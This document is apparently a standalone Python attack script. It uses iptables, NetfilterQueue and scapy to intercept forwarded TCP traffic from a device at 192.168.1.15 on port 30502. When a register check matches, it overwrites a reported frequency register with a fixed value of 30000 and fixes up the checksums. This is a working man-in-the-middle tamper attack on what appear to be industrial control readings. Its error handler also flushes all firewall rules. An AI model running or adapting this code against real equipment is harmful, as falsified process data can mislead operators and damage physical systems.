from scapy.all import *
from netfilterqueue import NetfilterQueue
import random

def modify_packet(scapy_packet):
    try:
        packet = IP(scapy_packet.get_payload())
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            data = payload[9:]

            first_register = int.from_bytes(data[0:2], byteorder="big")
            if first_register == 101 and len(payload) > 100:
                hz_register = int.from_bytes(data[32:34], byteorder="big")
                print("Orginal Frequecy:", hz_register)

                #change_value=random.randint(-5,5)
                change_value = 30000
                new_sec_register = change_value#hz_register + change_value
                new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]

                packet[Raw].load = modified_payload

                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

                print("Modified Frequecy:", new_sec_register)

                scapy_packet.set_payload(bytes(packet))

                print("Modified and sent packet")


        scapy_packet.accept()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        traceback.print_exc()
        scapy_packet.drop() 
        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")

def setup_iptables():
    os.system('iptables -I FORWARD -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')

def cleanup_iptables():
    os.system('iptables -D FORWARD -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')

try:
    setup_iptables()
    print("[*] IPTables rules set")
    nfqueue = NetfilterQueue()
    print("[*] Creating NFQUEUE")
    nfqueue.bind(1, modify_packet)
    print("[*] Starting NFQUEUE")
    print("[*] Waiting for packets")
    nfqueue.run() 
except Exception as e:
    print("[*] Error:", e)
except KeyboardInterrupt:
    print("[*] Stopping NFQUEUE")
finally:
    nfqueue.unbind()
    print("[*] Stopped NFQUEUE")
    cleanup_iptables()
    print("[*] IPTables rules removed")
    sys.exit(0)


#4. Queue Conflict
#Error: Failed to create queue 0
#Resolution:
#sudo rm /run/xtables.lock  # Clear stale lock
#sudo pkill -f NFQUEUE      # Kill existing queue users